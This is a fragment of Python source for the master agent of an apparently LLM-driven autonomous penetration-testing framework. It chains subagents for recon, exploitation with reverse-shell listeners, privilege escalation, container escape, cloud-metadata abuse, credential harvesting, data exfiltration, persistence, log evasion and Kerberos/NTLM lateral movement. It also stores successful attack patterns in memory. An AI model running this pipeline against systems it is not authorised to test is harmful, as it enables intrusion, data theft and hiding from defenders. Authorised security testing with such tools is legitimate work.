            "to":      new_state,
            "ts":      datetime.utcnow().isoformat()
        })
        await self.emit_reasoning(
            step       = "state_transition",
            reasoning  = f"Advancing from {old} → {new_state}",
            decision   = f"State machine: {new_state}",
            next_action= f"Execute {new_state.lower().replace('_',' ')} phase",
        )
        # Stamp phase start so the wall-clock budget can be enforced
        try:
            if self._context is not None:
                self._context.mark_phase_started(new_state)
        except Exception:
            pass

    # ─── Long-Term Memory ─────────────────────────────────────

    async def _recall_relevant_memories(self, target_type: str, tags: List[str]) -> str:
        """
        Query long-term memory for patterns relevant to this target.
        Returns a formatted string for LLM injection.
        """
        try:
            memories = await db.recall_memory(
                target_type=target_type,
                tags=tags,
                min_confidence=0.6,
                limit=5
            )
            if not memories:
                return ""
            lines = ["=== LONG-TERM MEMORY (from previous engagements) ==="]
            for m in memories:
                mtype   = m.get("memory_type", "?")
                content = m.get("content", {})
                conf    = m.get("confidence", 0)
                lines.append(f"[{mtype} | confidence={conf:.1f}]")
                if isinstance(content, dict):
                    for k, v in list(content.items())[:4]:
                        lines.append(f"  {k}: {str(v)[:120]}")
                else:
                    lines.append(f"  {str(content)[:200]}")
            lines.append("=== END MEMORY ===")
            self._intel["long_term_hits"] = memories
            return "\n".join(lines)
        except Exception:
            return ""

    async def _store_success_memory(self, memory_type: str, content: Dict, tags: List[str]):
        """
        Store a successful attack pattern to long-term memory.
        Called whenever exploitation/privesc succeeds.
        """
        try:
            await db.store_memory(
                memory_type  = memory_type,
                target_type  = self._intel.get("target_type", "unknown"),
                content      = content,
                tags         = tags,
                success      = True,
                confidence   = 0.85
            )
        except Exception as e:
            pass  # memory storage failure should never break the pentest

    # ─── MITRE ATT&CK Mapping ─────────────────────────────────

    # Mapping from tool/technique to MITRE technique IDs
    _MITRE_MAP = {
        "nmap":          ("T1046",  "Network Service Discovery",       "Discovery"),
        "gobuster":      ("T1083",  "File and Directory Discovery",    "Discovery"),
        "enum4linux":    ("T1087",  "Account Discovery",               "Discovery"),
        "nikto":         ("T1190",  "Exploit Public-Facing Application","Initial Access"),
        "sqlmap":        ("T1190",  "Exploit Public-Facing Application","Initial Access"),
        "hydra":         ("T1110",  "Brute Force",                     "Credential Access"),
        "metasploit":    ("T1203",  "Exploitation for Client Execution","Execution"),
        "msfconsole":    ("T1203",  "Exploitation for Client Execution","Execution"),
        "searchsploit":  ("T1588",  "Obtain Capabilities",             "Resource Development"),
        "smbclient":     ("T1021",  "Remote Services",                 "Lateral Movement"),
        "linpeas":       ("T1078",  "Valid Accounts",                  "Privilege Escalation"),
        "sudo":          ("T1548",  "Abuse Elevation Control Mechanism","Privilege Escalation"),
        "find":          ("T1083",  "File and Directory Discovery",    "Discovery"),
        "curl":          ("T1071",  "Application Layer Protocol",      "Command and Control"),
        "wget":          ("T1071",  "Application Layer Protocol",      "Command and Control"),
        "ssh":           ("T1021",  "Remote Services",                 "Lateral Movement"),
        "crackmapexec":  ("T1021",  "Remote Services",                 "Lateral Movement"),
        "impacket":      ("T1557",  "Adversary-in-the-Middle",         "Credential Access"),
    }

    async def _map_mitre(self, tool: str, success: bool = False, host: Optional[str] = None):
        """Auto-map a tool run to a MITRE ATT&CK technique."""
        tool_lower = tool.lower()
        entry = None
        for key, val in self._MITRE_MAP.items():
            if key in tool_lower:
                entry = val
                break
        if not entry:
            return
        tech_id, tech_name, tactic = entry
        # Add to in-memory intel
        technique = {"id": tech_id, "name": tech_name, "tactic": tactic, "tool": tool}
        if technique not in self._intel["mitre_techniques"]:
            self._intel["mitre_techniques"].append(technique)
        # Persist
        if self._session_id:
            try:
                await db.store_mitre_mapping(
                    session_id     = self._session_id,
                    technique_id   = tech_id,
                    technique_name = tech_name,
                    tactic         = tactic,
                    tool_used      = tool,
                    host           = host or self._target,
                    success        = success
                )
            except Exception:
                pass

    # ─── Evidence Collection Helper ──────────────────────────

    async def _capture_evidence(
        self,
        phase:         str,
        evidence_type: str,
        title:         str,
        content:       str,
        tool_used:     str = "",
        severity:      str = "info",
        mitre_tech:    str = None
    ):
        """
        Capture structured evidence during any phase.
        Automatically persists to DB and adds to intel.
        """
        if not content or len(content.strip()) < 10:
            return
        item = {
            "phase":           phase,
            "evidence_type":   evidence_type,
            "title":           title,
            "content":         content[:3000],
            "tool_used":       tool_used,
            "severity":        severity,
            "mitre_technique": mitre_tech,
            "captured_at":     datetime.utcnow().isoformat()
        }
        self._intel["evidence"].append(item)
        if self._session_id:
            try:
                await db.store_evidence(
                    session_id     = self._session_id,
                    phase          = phase,
                    evidence_type  = evidence_type,
                    title          = title,
                    content        = content[:3000],
                    host           = self._target,
                    tool_used      = tool_used,
                    severity       = severity,
                    mitre_technique= mitre_tech
                )
            except Exception:
                pass

    # ─── Phase Orchestration ──────────────────────────────────

    def _create_task(self, coro) -> asyncio.Task:
        """
        Wrapper around asyncio.create_task() that registers the task in
        _background_tasks so _wait_for_agents_idle() can drain them before
        report generation begins.  Completed tasks are automatically pruned
        from the list via a done-callback to avoid unbounded growth.
        """
        task = asyncio.create_task(coro)
        self._background_tasks.append(task)

        def _prune(t):
            try:
                self._background_tasks.remove(t)
            except ValueError:
                pass

        task.add_done_callback(_prune)
        return task

    # ─── Pause / Resume ───────────────────────────────────────

    async def pause(self) -> str:
        """
        Request a graceful pause.  The scan stops at the next phase boundary
        (not mid-tool), saves a manual_pause checkpoint, and sets session
        status to PAUSED.  Returns the checkpoint_id.
        """
        self._pause_event.clear()
        await self._emit("scan_paused", {
            "message":  "Pause requested — scan will stop after current phase",
            "phase":    str(self.phase or ""),
            "ts":       datetime.utcnow().isoformat()
        })
        # The actual checkpoint is written by _check_pause() at the next boundary.
        # Return empty string here — callers should read the session's
        # last_checkpoint_id from the DB after the boundary is reached.
        return ""

    async def resume(self) -> bool:
        """
        Resume a paused scan.  Sets the pause event so _check_pause() unblocks.
        Returns True if the scan was actually paused, False if it was already running.
        """
        if self._pause_event.is_set():
            return False   # already running
        self._pause_event.set()
        await self._emit("scan_resumed", {
            "message": "Scan resumed",
            "phase":   str(self.phase or ""),
            "ts":      datetime.utcnow().isoformat()
        })
        return True

    # ══════════════════════════════════════════════════════════════════════════
    #  META-AGENT HELPERS
    # ══════════════════════════════════════════════════════════════════════════

    async def _handle_corrections(
        self,
        corrections: List,
        phase: str,
        *,
        allow_replan: bool = True,
    ) -> None:
        """
        Apply tiered corrections from meta-agents.

        Blocking (confidence >= BLOCKING_THRESHOLD):
          - Inject as MANDATORY CORRECTION into next planning context.
          - Emit meta_correction WS event.

        Advisory (confidence < BLOCKING_THRESHOLD):
          - Append to _meta_advisory_context rolling buffer.
          - Emit meta_correction WS event.
        """
        if not corrections:
            return

        blocking = [c for c in corrections if c.tier == "blocking"]
        advisory = [c for c in corrections if c.tier == "advisory"]

        for c in advisory:
            note = f"[{c.source}|{c.phase}] {c.description} → {c.recommended_action}"
            self._meta_advisory_context.append(note)
            if _META_AGENTS_AVAILABLE and len(self._meta_advisory_context) > MAX_ADVISORY_CONTEXT:
                self._meta_advisory_context = self._meta_advisory_context[-MAX_ADVISORY_CONTEXT:]
            await self._emit("meta_correction", {**c.to_dict(), "tier": "advisory"})

        for c in blocking:
            # C7 — a "blocking" correction must actually reach the planner, not
            # merely emit an event (the old behaviour: `allow_replan` /
            # MAX_REPLAN_RETRIES were dead code, so "blocking" had LESS effect
            # than "advisory").  Inject it into the advisory context as a
            # MANDATORY line so it surfaces — weighted above advisories — in the
            # next planning prompt.
            note = f"[MANDATORY|{c.source}|{c.phase}] {c.description} → {c.recommended_action}"
            self._meta_advisory_context.append(note)
            if _META_AGENTS_AVAILABLE and len(self._meta_advisory_context) > MAX_ADVISORY_CONTEXT:
                self._meta_advisory_context = self._meta_advisory_context[-MAX_ADVISORY_CONTEXT:]
            await self._emit("meta_correction", {**c.to_dict(), "tier": "blocking"})
            try:
                await self.emit_reasoning(
                    step      = f"meta_blocking_{phase}",
                    reasoning = f"BLOCKING correction from {c.source}: {c.description}",
                    decision  = c.recommended_action,
                    next_action="Injected as MANDATORY context for the next planning step",
                )
            except Exception:
                pass

    async def _meta_advisory_prompt_block(self) -> str:
        """Return advisory context formatted for injection into LLM planning prompts."""
        if not self._meta_advisory_context:
            return ""
        lines = "\n".join(f"  • {note}" for note in self._meta_advisory_context[-10:])
        return f"\n=== META-AGENT ADVISORY CONTEXT ===\n{lines}\n=== END ADVISORY ===\n"

    async def _meta_tool_listener(self) -> None:
        """
        Background task: keeps alive for the full scan duration.
        Per-tool validation corrections are enqueued by subagent store_finding hooks
        and drained at post-phase _handle_corrections().
        """
        while not self._stop_requested:
            try:
                await asyncio.sleep(0.5)
            except asyncio.CancelledError:
                break
            except Exception as exc:
                import logging as _log
                _log.getLogger(__name__).warning("[meta_listener] error: %s", exc)

    async def _drain_pending_corrections(self, phase: str) -> None:
        """Drain all queued per-tool corrections and handle them."""
        corrections: List = []
        while not self._pending_corrections.empty():
            try:
                item = self._pending_corrections.get_nowait()
                if isinstance(item, list):
                    corrections.extend(item)
                else:
                    corrections.append(item)
            except asyncio.QueueEmpty:
                break
        if corrections:
            await self._handle_corrections(corrections, phase, allow_replan=False)

    # ══════════════════════════════════════════════════════════════════════════

    async def _save_checkpoint(self, checkpoint_type: str = "auto") -> Optional[str]:
        """
        Serialise current MasterAgent state to session_checkpoints collection.
        Returns the checkpoint_id, or None if no session_id is set.
        """
        if not self._session_id:
            return None
        try:
            _raw_snap = dict(self._intel)
            # B-6 — augment the snapshot with exfil-pipeline state so the
            # report generator can render the Loot / Web-Intel / Primer
            # sections.  Without these, the new report sections would
            # always be empty even when loot was harvested.
            try:
                xp = getattr(self, "_exfil_pipeline", None)
                if xp is not None:
                    _raw_snap["loot_entries"] = xp.list_entries()
                    _raw_snap["loot_summary"] = xp.manifest_summary()
            except Exception:
                pass
            # MongoDB requires ALL document keys to be strings and can't store
            # sets.  intel has several int-keyed dicts (services {22:…},
            # service_versions {22:…}, banners {…}); a shallow services-only
            # fix left service_versions int keys → "key was 22" crash on save.
            # Deep-sanitise the whole snapshot once.
            def _mongo_safe(obj):
                if isinstance(obj, dict):
                    return {str(k): _mongo_safe(v) for k, v in obj.items()}
                if isinstance(obj, (list, tuple)):
                    return [_mongo_safe(x) for x in obj]
                if isinstance(obj, set):
                    return [_mongo_safe(x) for x in obj]
                # Only BSON-encodable primitives pass through.  Anything else
                # (BoundedInstructionCache, callables, custom objects) was
                # crashing EVERY checkpoint save — "cannot encode object" — so
                # objective/answer state NEVER persisted.  Stringify the rest.
                import datetime as _dt
                if isinstance(obj, (str, int, float, bool, bytes)) or obj is None:
                    return obj
                if isinstance(obj, _dt.datetime):
                    return obj
                if isinstance(obj, _dt.date):
                    return obj.isoformat()
                return f"<{type(obj).__name__}>"
            _intel_snap = _mongo_safe(_raw_snap)
            cid = await db.store_checkpoint(
                session_id            = self._session_id,
                host                  = self._target,
                checkpoint_type       = checkpoint_type,
                state_machine         = self._intel.get("state", "INIT"),
                current_phase         = str(self.phase or ""),
                phases_completed      = list(self._phases_completed),
                phases_to_run         = list(self._phases_to_run),
                intel_snapshot        = _intel_snap,
                used_tools            = dict(self._used_tools),
                pending_confirmations = list(self._confirm_events.keys()),
                in_flight_subagents   = [
                    t for t in self._background_tasks if not t.done()
                    # we can't serialise Task objects; store count placeholder
                ] and [],
                master_config         = dict(self._master_config),
            )
            return cid
        except Exception as _e:
            import logging as _l
            _l.getLogger(__name__).warning("Checkpoint save failed: %s", _e)
            return None

    async def _check_pause(self, phase_label: str = "") -> None:
        """
        Called at every phase boundary.  If a pause has been requested,
        saves a manual_pause checkpoint and blocks until resume() is called.
        Also saves an auto checkpoint when called normally (not paused).
        """
        if not self._pause_event.is_set():
            # Operator requested pause — save checkpoint then wait
            await self.emit_reasoning(
                step       = "paused",
                reasoning  = f"Scan paused by operator after phase: {phase_label}",
                decision   = "Saving checkpoint and waiting for resume",
                next_action= "Call POST /sessions/{id}/resume to continue"
            )
            await self._save_checkpoint("manual_pause")
            await db.update_session(self._session_id, {"status": "paused"})
            # Block until resume() sets the event
            await self._pause_event.wait()
            await db.update_session(self._session_id, {"status": "active"})
            await self.emit_reasoning(
                step       = "resumed",
                reasoning  = "Scan resumed by operator",
                decision   = "Continuing from next phase",
                next_action= f"Proceeding after: {phase_label}"
            )
        else:
            # Normal path — save auto checkpoint at this boundary
            await self._save_checkpoint("auto")

    async def _run_phase_subagents(self, phase: str, target: str, **kwargs) -> None:
        """
        Launch the subagent orchestrator(s) for *phase* in a fire-and-forget task.

        Called after each phase's execute_tasks() so that fine-grained subagent
        findings, WS events, and SubagentConsolePage state are all populated even
        during the autonomous pentest — not just when subagents are run manually.

        Each orchestrator runs independently in the background; exceptions are
        swallowed so a subagent crash never blocks the main pentest flow.
        """
        import db.mongo_client as _db

        sa_broadcast = self._make_sa_broadcast()
        sid          = self._session_id or ""

        async def _safe(coro):
            try:
                await coro
            except Exception as exc:
                await self.emit_reasoning(
                    step       = f"subagent_err_{phase}",
                    reasoning  = f"Subagent phase '{phase}' error (non-fatal): {exc}",
                    decision   = "Continuing pentest — subagent result not required",
                    next_action= "Main flow unaffected",
                )

        if phase == "recon":
            from agents.recon.network_scan_subagent    import NetworkScanSubagent
            from agents.recon.dns_recon_subagent        import DnsReconSubagent
            from agents.recon.service_banner_subagent   import ServiceBannerSubagent
            from agents.recon.web_fingerprint_subagent  import WebFingerprintSubagent
            kw  = dict(session_id=sid, target=target, broadcast=sa_broadcast, db=_db.get_db())

            # NetworkScanSubagent's parsed_data is the authoritative port list.
            # Sync its findings back to self._intel once it completes so later
            # phases / hypothesis engine don't show "no open ports" when the
            # LLM-planned master scan missed any.
            async def _run_network_scan_and_sync():
                try:
                    res = await NetworkScanSubagent(**kw).execute()
                    pd  = getattr(res, "parsed_data", {}) or {}
                    new_ports = pd.get("open_ports") or []
                    if new_ports:
                        existing = self._intel.get("open_ports") or []
                        merged = list(dict.fromkeys(list(existing) + list(new_ports)))
                        self._intel["open_ports"] = merged
                    for p in pd.get("ports") or []:
                        if isinstance(p, dict) and p.get("port") is not None:
                            self._intel.setdefault("services", {})[p["port"]] = {
                                "service":  p.get("service", ""),
                                "version":  p.get("version", ""),
                                "protocol": p.get("protocol", "tcp"),
                                "port":     p["port"],
                                "banner":   p.get("banner", ""),
                            }
                    if pd.get("os_guess") and pd["os_guess"] != "unknown":
                        if self._intel.get("os_guess", "unknown") in ("", "unknown"):
                            self._intel["os_guess"] = pd["os_guess"]
                except Exception as exc:
                    await self.emit_reasoning(
                        step       = "subagent_err_recon_network_scan",
                        reasoning  = f"NetworkScanSubagent error (non-fatal): {exc}",
                        decision   = "Continuing pentest",
                        next_action= "Main flow unaffected",
                    )

            coros = [
                _run_network_scan_and_sync(),
                DnsReconSubagent(**kw).execute(),
                ServiceBannerSubagent(**kw).execute(
                    ports=self._intel.get("open_ports", []),
                    services=self._intel.get("services", {}),
                ),
            ]
            # Add web fingerprint subagents for each detected HTTP service
            for port, svc in list(self._intel.get("services", {}).items())[:3]:
                svc_name = (svc.get("service","") if isinstance(svc, dict) else str(svc)).lower()
                if any(x in svc_name for x in ("http", "https")):
                    proto = "https" if int(str(port)) in (443, 8443) else "http"
                    coros.append(WebFingerprintSubagent(**kw).execute(
                        url=f"{proto}://{target}:{port}"
                    ))
            await self._await_and_sync_subagents(coros, phase="recon", timeout=300.0)

        elif phase == "vuln":
            from agents.vuln.cve_lookup_subagent    import CveLookupSubagent
            from agents.vuln.ssl_audit_subagent      import SslAuditSubagent
            from agents.vuln.smb_vuln_subagent       import SmbVulnSubagent
            from agents.vuln.service_vuln_subagent   import ServiceVulnSubagent
            kw    = dict(session_id=sid, target=target, broadcast=sa_broadcast, db=_db.get_db())
            # Transform intel services dict {port: {service, version, ...}} into
            # list of dicts expected by CveLookup / ServiceVuln subagents.
            _svc_map = self._intel.get("services", {}) or {}
            _svc_list: list[dict] = []
            for _p, _s in _svc_map.items():
                if isinstance(_s, dict):
                    _entry = dict(_s)
                    _entry.setdefault("port", _p)
                    _svc_list.append(_entry)
                else:
                    _svc_list.append({"port": _p, "service": str(_s), "version": ""})
            coros = [
                CveLookupSubagent(**kw).execute(
                    services_list=_svc_list,
                    cves=self._intel.get("cves", []),
                ),
                ServiceVulnSubagent(**kw).execute(services_list=_svc_list),
            ]
            ports = set(str(p) for p in self._intel.get("open_ports", []))
            if ports & {"443", "8443", "8080", "80"}:
                coros.append(SslAuditSubagent(**kw).execute())
            if ports & {"445", "139"}:
                coros.append(SmbVulnSubagent(**kw).execute())
            await self._await_and_sync_subagents(coros, phase="vuln", timeout=240.0)

        elif phase == "exploit":
            # C10/C4 — only ONE ExploitOrchestrator at a time per engagement.
            # _phase_exploit (reachable from bootstrap, stall-escalation AND the
            # compromise-gate) and the entry-attempt dispatcher's
            # _attempt_exploit_for_cves both launch orchestrators; running them
            # concurrently races the same CVEs/target (duplicate network load,
            # competing first-to-win shells).  Skip if one is already in flight.
            if getattr(self, "_exploit_orch_active", False):
                await self.emit_reasoning(
                    step       = "exploit_orch_dedup",
                    reasoning  = ("An ExploitOrchestrator is already running for "
                                  "this engagement — not launching a duplicate."),
                    decision   = "SKIP duplicate concurrent orchestrator",
                    next_action= "Let the in-flight orchestrator finish",
                )
                return
            from agents.exploit.exploit_orchestrator  import ExploitOrchestrator
            orch = ExploitOrchestrator(broadcast=sa_broadcast)
            orch._session_id = sid

            # Recommendation C — auto-detect LHOST via the listener manager
            # (or operator override) instead of the literal-string default.
            lm    = getattr(self, "listener_manager", None)
            lhost = kwargs.get("lhost") or (lm.lhost if lm else None) or self._auto_detect_lhost()
            lport = int(kwargs.get("lport") or 4444)

            self._exploit_orch_active = True
            try:
                await self._await_and_sync_subagents(
                    [orch.run(
                        session_id   = sid,
                        target       = target,
                        db           = _db.get_db(),
                        services     = list(self._intel.get("services", {}).values()),
                        cves         = self._intel.get("cves", []),
                        open_ports   = self._intel.get("open_ports", []),
                        web_urls     = [
                            f"http{'s' if int(str(p)) in (443,8443) else ''}://{target}:{p}"
                            for p, s in self._intel.get("services",{}).items()
                            if any(x in (s.get("service","") if isinstance(s,dict) else str(s)).lower()
                                   for x in ("http","https"))
                        ][:3],
                        lhost        = lhost,
                        lport        = lport,
                    )],
                    phase="exploit", timeout=600.0,
                )
            finally:
                self._exploit_orch_active = False

        elif phase == "privesc":
            # ── ENUMERATE → then actually EXPLOIT ────────────────────────────
            # Previously this only ran the ENUM subagents; the matching EXPLOIT
            # subagents (linux/windows escalation, container escape, cloud-meta)
            # were defined but ORPHANED — so privesc discovered vectors and then
            # did nothing with them.  Now we enumerate, feed the results into the
            # OS-appropriate exploit subagent, and add container/cloud escalation
            # when detected.  (This whole phase is already gated on shell_access.)
            from agents.privesc.linux_enum_subagent    import LinuxEnumSubagent
            from agents.privesc.windows_enum_subagent  import WindowsEnumSubagent
            kw    = dict(session_id=sid, target=target, broadcast=sa_broadcast, db=_db.get_db())
            os_guess = self._intel.get("os_guess", "").lower()
            _is_win  = "windows" in os_guess
            lm    = getattr(self, "listener_manager", None)
            lhost = (getattr(lm, "lhost", None) if lm else None) or self._auto_detect_lhost()
            lport = 4445

            # 1) Enumerate (capture parsed_data to feed the exploit subagent)
            if _is_win:
                enum_res = await WindowsEnumSubagent(**kw).execute()
            else:
                enum_res = await LinuxEnumSubagent(**kw).execute()
            _er = getattr(enum_res, "parsed_data", {}) or {}

            # 2) Exploit — escalate from the enumerated vectors
            coros = []
            try:
                if _is_win:
                    from agents.privesc.windows_exploit_subagent import WindowsExploitSubagent
                    coros.append(WindowsExploitSubagent(**kw).execute(
                        lhost=lhost, lport=lport, enum_results=_er))
                else:
                    from agents.privesc.linux_exploit_subagent import LinuxExploitSubagent
                    coros.append(LinuxExploitSubagent(**kw).execute(enum_results=_er))
            except Exception as _ie:
                await self.emit_reasoning(
                    step="privesc_exploit_unavailable",
                    reasoning=f"privesc exploit subagent import failed: {_ie}",
                    decision="Continue with enum findings only", next_action="")

            # 3) Container escape + cloud-metadata — detection-gated
            _blob = (str(self._intel.get("os_guess", "")) + " "
                     + " ".join(str(v) for v in (self._intel.get("services") or {}).values())
                     + " " + " ".join(str(v) for v in _er.values()
                                       if isinstance(v, (str, int, float)))).lower()
            try:
                if self._intel.get("container_info") or any(
                        s in _blob for s in ("docker", "containerd", "lxc",
                                             "kubernetes", "dockerenv")):
                    from agents.privesc.container_escape_subagent import ContainerEscapeSubagent
                    coros.append(ContainerEscapeSubagent(**kw).execute())
            except Exception:
                pass
            try:
                _cloud = self._intel.get("cloud") or (
                    "aws" if ("ec2" in _blob or "amazon" in _blob) else
                    "gcp" if "google" in _blob else
                    "azure" if "azure" in _blob else "")
                if _cloud:
                    from agents.privesc.cloud_meta_subagent import CloudMetaSubagent
                    coros.append(CloudMetaSubagent(**kw).execute(cloud=_cloud))
            except Exception:
                pass

            if coros:
                await self._await_and_sync_subagents(coros, phase="privesc", timeout=360.0)

        elif phase == "web":
            from agents.web.dir_fuzz_subagent                  import DirFuzzSubagent
            from agents.web.web_vuln_scan_subagent             import WebVulnScanSubagent
            from agents.web.sqli_subagent                      import SqliSubagent
            from agents.web.xss_subagent                       import XssSubagent
            from agents.web.ssrf_subagent                      import SsrfSubagent
            from agents.web.broken_access_control_subagent     import BrokenAccessControlSubagent
            from agents.web.crypto_failures_subagent           import CryptoFailuresSubagent
            from agents.web.insecure_design_subagent           import InsecureDesignSubagent
            from agents.web.data_integrity_subagent            import DataIntegritySubagent
            from agents.web.owasp2025_native_probes            import OWASP2025NativeProbesSubagent
            from agents.web.injection_subagent                 import InjectionSubagent
            from agents.web.auth_bypass_subagent               import AuthBypassSubagent
            from agents.web.cms_subagent                       import CmsSubagent
            from agents.web.burp_subagent                      import BurpSubagent
            kw = dict(session_id=sid, target=target, broadcast=sa_broadcast, db=_db.get_db())
            web_urls = kwargs.get("web_urls", [])
            # Build URL list from intel if not passed explicitly
            if not web_urls:
                web_urls = [
                    f"http{'s' if int(str(p)) in (443, 8443) else ''}://{target}:{p}"
                    for p, s in self._intel.get("services", {}).items()
                    if any(x in (s.get("service", "") if isinstance(s, dict) else str(s)).lower()
                           for x in ("http", "https"))
                ][:4]
            # Always ensure at least one URL to test.  When the operator
            # supplied an explicit URL/app target (intel.target_url) put
            # that FIRST so web tools hit the operator's exact endpoint
            # instead of the synthesised root.  Fall back to the legacy
            # http/https-on-host pair for IP / hostname targets.
            if not web_urls:
                explicit = self._intel.get("target_url")
                host     = self._intel.get("target_host") or target
                if explicit:
                    web_urls = [explicit, f"http://{host}", f"https://{host}"]
                    # dedup
                    seen = set(); web_urls = [u for u in web_urls if not (u in seen or seen.add(u))]
                else:
                    web_urls = [f"http://{host}", f"https://{host}"]
            coros = []
            for url in web_urls[:3]:
                coros += [
                    DirFuzzSubagent(**kw).execute(url=url),
                    WebVulnScanSubagent(**kw).execute(url=url),
                    SqliSubagent(**kw).execute(url=url),
                    XssSubagent(**kw).execute(url=url),
                    InjectionSubagent(**kw).execute(url=url),
                    AuthBypassSubagent(**kw).execute(url=url),
                    CmsSubagent(**kw).execute(url=url),
                    BrokenAccessControlSubagent(**kw).execute(url=url),
                    CryptoFailuresSubagent(**kw).execute(url=url),
                    InsecureDesignSubagent(**kw).execute(url=url),
                    DataIntegritySubagent(**kw).execute(url=url),
                    OWASP2025NativeProbesSubagent(**kw).execute(url=url),
                ]
                if url.startswith("https"):
                    coros.append(SsrfSubagent(**kw).execute(url=url))
            # Burp Suite runs once per URL (uses URL as scan target; falls back to Nikto if API unavailable)
            # Pass all remaining URLs as extra_urls so Burp's passive scanner covers the full scope
            for idx, url in enumerate(web_urls[:2]):
                other_urls = [u for u in web_urls if u != url]
                burp_kw = dict(kw, target=url)
                coros.append(BurpSubagent(**burp_kw).execute(extra_urls=other_urls))
            if coros:
                await self._await_and_sync_subagents(coros, phase="web", timeout=480.0)

        elif phase == "post":
            from agents.post.local_cred_harvest_subagent import LocalCredHarvestSubagent
            from agents.post.data_exfil_subagent         import DataExfilSubagent
            from agents.post.persistence_subagent        import PersistenceSubagent
            from agents.post.log_evasion_subagent        import LogEvasionSubagent
            kw = dict(session_id=sid, target=target, broadcast=sa_broadcast, db=_db.get_db())
            shells = self._intel.get("shells", [])
            shell_id = shells[0].get("id") if shells else kwargs.get("shell_id")
            coros = [
                LocalCredHarvestSubagent(**kw).execute(shell_id=shell_id),
                DataExfilSubagent(**kw).execute(shell_id=shell_id),
            ]
            # Persistence and evasion only if root/admin obtained
            current_user = self._intel.get("current_user", "")
            if current_user in ("root", "SYSTEM", "Administrator") or self._intel.get("root_flag"):
                coros += [
                    PersistenceSubagent(**kw).execute(shell_id=shell_id),
                    LogEvasionSubagent(**kw).execute(shell_id=shell_id),
                ]
            # Metasploit post modules — only meaningful with an active MSF /
            # meterpreter session (else it has nothing to attach to).  Wired
            # conditionally so it's integrated-when-applicable, not orphaned.
            try:
                _msf_shell = next(
                    (s for s in shells if isinstance(s, dict) and any(
                        k in str(s.get("method", "")) + str(s.get("source", "")).lower()
                        for k in ("meterpreter", "metasploit"))),
                    None)
                if _msf_shell:
                    from agents.exploit.post_module_subagent import PostModuleSubagent
                    _ost = ("windows" if "windows" in self._intel.get("os_guess", "").lower()
                            else "linux")
                    coros.append(PostModuleSubagent(**kw).execute(
                        os_type=_ost,
                        session_id_msf=str(_msf_shell.get("msf_session")
                                           or _msf_shell.get("session_id") or "1")))
            except Exception:
                pass
            await self._await_and_sync_subagents(coros, phase="post", timeout=300.0)

        elif phase == "lateral":
            # ── OS / profile gate (Overpass-3 post-mortem) ──────────
            # The AD subagents (enum4linux-ng, GetUserSPNs, ntlmrelayx)
            # only make sense against Windows / Active Directory
            # targets.  On the Overpass-3 LINUX box they ran anyway and
            # wasted ~15 minutes (ntlm_capture alone = 844s) producing
            # only "Null session not allowed" / "no SPNs" noise.
            # Gate the entire AD lateral block behind a Windows/AD
            # signal: SMB/LDAP/Kerberos ports, a discovered domain, or
            # an explicit ad_dc target profile.
            _open = set()
            for p in (self._intel.get("open_ports") or []):
                try:
                    _open.add(int(str(p).split("/")[0]))
                except Exception:
                    pass
            _os = (self._intel.get("os_guess") or "").lower()
            _has_ad_ports = bool(_open & {445, 139, 389, 88, 636, 3268})
            _has_domain   = bool(self._intel.get("domain") or self._intel.get("dc_ip"))
            _is_windows   = "windows" in _os
            _profile      = (self._intel.get("target_profile") or "").lower()
            _ad_context = (_has_ad_ports or _has_domain or _is_windows
                             or _profile in ("ad_dc", "windows"))
            if not _ad_context:
                await self.emit_reasoning(
                    step       = "lateral_skip_no_ad",
                    reasoning  = (
                        f"Lateral AD subagents SKIPPED — no Active Directory "
                        f"context (open ports {sorted(_open)}, os={_os or '?'}, "
                        f"profile={_profile or '?'}).  enum4linux-ng / "
                        f"Kerberos / NTLM-relay only apply to Windows/AD "
                        f"targets; running them on a Linux host wastes "
                        f"~15 min producing only negative results."
                    ),
                    decision   = "SKIP lateral AD enumeration",
                    next_action= "Use Linux-appropriate lateral techniques (SSH key reuse, sudo, NFS) instead",
                )
                # Linux-appropriate lateral: credential reuse via SSH to
                # adjacent hosts is handled by the loot/cred pipeline.
                return
            from agents.lateral.ad_enum_subagent      import AdEnumSubagent
            from agents.lateral.kerberos_subagent     import KerberosSubagent
            from agents.lateral.ntlm_capture_subagent import NtlmCaptureSubagent
            kw = dict(session_id=sid, target=target, broadcast=sa_broadcast, db=_db.get_db())
            coros = [AdEnumSubagent(**kw).execute()]
            # Kerberos + NTLM only if domain context found
            if self._intel.get("domain") or self._intel.get("dc_ip"):
                coros += [
                    KerberosSubagent(**kw).execute(
                        domain=self._intel.get("domain", ""),
                        dc_ip=self._intel.get("dc_ip", target),
                    ),
                    NtlmCaptureSubagent(**kw).execute(),
                ]
            await self._await_and_sync_subagents(coros, phase="lateral", timeout=360.0)

    def _auto_detect_lhost(self) -> str:
        """Best-effort attacker-IP detection for reverse-shell payloads.

        Order: explicit operator override → ListenerManager.lhost →
        primary VPN/tap interface → first non-loopback IPv4 → "127.0.0.1".
        Never raises; falls back to "127.0.0.1" so callers can still
        construct a command (failure is then visible in the listener).
        """
        # Operator override on intel.
        op = (self._intel.get("attacker_ip") or "").strip()
        if op:
            return op

        try:
            import netifaces
            preferred = ("tun0", "tap0", "vpn0", "wg0", "eth0", "en0")
            for iface in preferred:
                if iface not in netifaces.interfaces():
                    continue
                addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET) or []
                for a in addrs:
                    ip = a.get("addr", "")
                    if ip and not ip.startswith("127."):
                        return ip
            # Fallback: any non-loopback IPv4.
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET) or []
                for a in addrs:
                    ip = a.get("addr", "")
                    if ip and not ip.startswith("127.") and not ip.startswith("169.254."):
                        return ip
        except Exception:
            pass

        # Last resort — at least makes the listener auditable.
        return "127.0.0.1"

    async def _await_and_sync_subagents(
        self,
        coros: list,
        *, phase: str,
        timeout: float = 240.0,
    ) -> None:
        """Recommendation B — await subagent coroutines and merge their
        ``parsed_data`` (or equivalent) back into ``self._intel`` before the
        next phase begins.

        The previous fire-and-forget pattern (``self._create_task(_safe(
        asyncio.gather(...)))``) made every subagent's findings race against
        the next phase reading ``self._intel``.  On a fast cloud LLM the
        next phase would routinely fire before recon subagents had even
        finished, so the hypothesis engine looked at empty intel.

        ``timeout`` is per-batch wall-clock — long enough that nmap full-port
        scans and gobuster wordlists complete, short enough that one
        misbehaving subagent can't stall the engagement.
        """
        if not coros:
            return

        # Race-aware: stop_requested aborts the wait early.
        try:
            results = await asyncio.wait_for(
                asyncio.gather(*coros, return_exceptions=True),
                timeout=timeout,
            )
        except asyncio.TimeoutError:
            await self.emit_reasoning(
                step       = f"subagent_timeout_{phase}",
